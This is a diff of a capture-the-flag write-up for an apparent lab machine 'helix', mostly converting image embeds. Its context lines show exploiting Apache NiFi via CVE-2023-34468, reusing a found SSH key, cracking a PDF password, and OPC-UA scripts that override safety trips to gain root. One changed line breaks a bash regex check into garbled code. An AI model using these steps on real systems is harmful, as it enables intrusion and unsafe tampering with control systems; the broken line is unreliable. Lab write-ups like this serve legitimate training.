@@ -24,7 +24,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ### Port 80
 
-![[Pasted image 20260512050441.png]]
+![Pasted image 20260512050441](../Attachments/Pasted%20image%2020260512050441.png)
 
 ## FFuf 
 - Reveals a subdomain `flow`:
@@ -57,9 +57,9 @@ flow                    [Status: 200, Size: 1068, Words: 110, Lines: 28, Duratio
 :: Progress: [20481/20481] :: Job [1/1] :: 2000 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
 
 ```
-![[Pasted image 20260512050954.png]]
+![Pasted image 20260512050954](../Attachments/Pasted%20image%2020260512050954.png)
 - On browser it opens a page saying `Did you mean /nifi` and then auto redirects to that path:
-![[Pasted image 20260512051107.png]]
+![Pasted image 20260512051107](../Attachments/Pasted%20image%2020260512051107.png)
 
 - Looking online we see a CVE for nifi: CVE-2023-34468
 - I find a public exploit: https://github.com/Al3xx-sec/CVE-2023-34468-POC/blob/main/CVE-2023-34468_poc.py
@@ -529,8 +529,8 @@ python3 exploit2.py --target http://flow.helix.htb \
 [+] rce.sql delivered to target
 ...
 ```
-![[Pasted image 20260512081717.png]]
-![[Pasted image 20260512081600.png]]
+![Pasted image 20260512081717](../Attachments/Pasted%20image%2020260512081717.png)
+![Pasted image 20260512081600](../Attachments/Pasted%20image%2020260512081600.png)
 
 - Looking around I find a private key for user `operator`(home directory available):
 ```
@@ -544,7 +544,7 @@ tKtsROxZUMfwHjVUc1s7AAAAD3Jvb3RAbWFuYWdlbWVudAECAwQFBg==
 -----END OPENSSH PRIVATE KEY-----
 
 ```
-![[Pasted image 20260512081653.png]]
+![Pasted image 20260512081653](../Attachments/Pasted%20image%2020260512081653.png)
 
 - I copy the key locally and set the right permissions and manage to log in to target as user `operator`
 ```
@@ -552,7 +552,7 @@ vi id_ed25519
 chmod 0600 id_ed25519
 ssh operator@helix.htb -i id_ed25519
 ```
-![[Pasted image 20260512081904.png]]
+![Pasted image 20260512081904](../Attachments/Pasted%20image%2020260512081904.png)
 
 - I find a pdf `Operator Control and Safety Guide`. I get it to my local machine
 ```
@@ -568,7 +568,7 @@ pdf2john Operator\ Control\ \&\ Safety\ Guide.pdf
 
 Operator Control & Safety Guide.pdf:$pdf$5*6*256*-4*1*16*7c46c5fed97042269c802d39f7ba411b*48*a3bf8039a5f2a39d85b611b374b74debe6be3aa6f01dc1a6e8dd5cd4157499f9a3efe04ca0c999bcac23d7efd22e8366*48*c8909cc91d0fa3d97bf1ce139c46df1936b2b9dc15a305a659d5eb2b1c3172da04ddf8efbfea0a98b3e5043e883ab3e7*32*d3e8e21436f4263214102eebcf3a51d2a4e5049fc2e2aaf50e594ce952db7011*32*a3b05cab12d5403fb8e96415a023560c9453cea981ddbb72d92650c0933785b5
 ```
-![[Pasted image 20260512082114.png]]
+![Pasted image 20260512082114](../Attachments/Pasted%20image%2020260512082114.png)
 
 - I copy the hash (from `$pdf$`) and crack it:
 ```
@@ -583,7 +583,7 @@ operator1        (?)
 Use the "--show --format=PDF" options to display all of the cracked passwords reliably
 Session completed.
 ```
-![[Pasted image 20260512082156.png]]
+![Pasted image 20260512082156](../Attachments/Pasted%20image%2020260512082156.png)
 
 - The password is `operator1`
 
@@ -597,7 +597,7 @@ Matching Defaults entries for operator on helix:
 User operator may run the following commands on helix:
     (root) NOPASSWD: /usr/local/sbin/helix-maint-console
 ```
-![[Pasted image 20260512082339.png]]
+![Pasted image 20260512082339](../Attachments/Pasted%20image%2020260512082339.png)
 
 - From the pdf, it states there are 3 variables monitored: Temperature, pressure and Calibration offset
 	- There are 3 safety variables : TripActive, RodINsterted and EmergencyCooling
@@ -658,7 +658,7 @@ window_ok() {
   local until_ts now
   until_ts="$(read_until)"
   now="$(date +%s)"
-  [[ "$until_ts" =~ ^[0-9]+$ ]] || return 1
+  [ "$until_ts" =~ ^[0-9](%20"$until_ts"%20=~%20^[0-9) || return 1
   [ "$now" -lt "$until_ts" ] || return 1
   return 0
 }
@@ -753,7 +753,7 @@ hr{border:0;border-top:1px solid #233045;margin:12px 0}
 
 <script>setTimeout(()=>location.reload(), 1500);</script>
 ```
-![[Pasted image 20260512085349.png]]
+![Pasted image 20260512085349](../Attachments/Pasted%20image%2020260512085349.png)
 
 - It also gives the url for the OPC-UA control: `127.0.0.1:4840/helix/`
 
@@ -841,7 +841,7 @@ i=86 — QualifiedName(NamespaceIndex=0, Name='Types')
 i=87 — QualifiedName(NamespaceIndex=0, Name='Views')
 ```
 
-![[Pasted image 20260512085254.png]]
+![Pasted image 20260512085254](../Attachments/Pasted%20image%2020260512085254.png)
 - Now to find the CallibrationOffset node:
 - browse2.py
 ```
@@ -888,7 +888,7 @@ python3 browse2,.py
   ns=2;i=13 — TestOverride = False
   ns=2;i=14 — ResetTrip = False
 ```
-![[Pasted image 20260512085055.png]]
+![Pasted image 20260512085055](../Attachments/Pasted%20image%2020260512085055.png)
 
 - Now from the documentation I pass the following codes. First I reset (as i made some mistakes earlier)
 - reset.py
@@ -914,7 +914,7 @@ python3 reset.py
 [+] CalibrationOffset reset to 0.0
 [+] ResetTrip requested
 ```
-![[Pasted image 20260512085028.png]]
+![Pasted image 20260512085028](../Attachments/Pasted%20image%2020260512085028.png)
 - Switch to maintenance mode: `maintenace.py`:
 ```
 import asyncio
@@ -937,7 +937,7 @@ python3 maintenance.py
 [+] Mode set to MAINTENANCE
 [+] TestOverride enabled
 ```
-![[Pasted image 20260512085000.png]]
+![Pasted image 20260512085000](../Attachments/Pasted%20image%2020260512085000.png)
 - Finally we slowly ramp calibration offset to the required value which will increase the temperature to 295 which is qwhere we can access the maintenance window:
 - calib.py
 ```
@@ -975,10 +975,10 @@ sudo /usr/local/sbin/helix-maint-console
 root@helix:/home/operator#
 ```
 
-![[Pasted image 20260512084855.png]]
+![Pasted image 20260512084855](../Attachments/Pasted%20image%2020260512084855.png)
 
 - I get root flag:
-![[Pasted image 20260512084935.png]]
+![Pasted image 20260512084935](../Attachments/Pasted%20image%2020260512084935.png)
 
 ----
 - We can also see the conditions required to enter the maintenance window without tripping it:
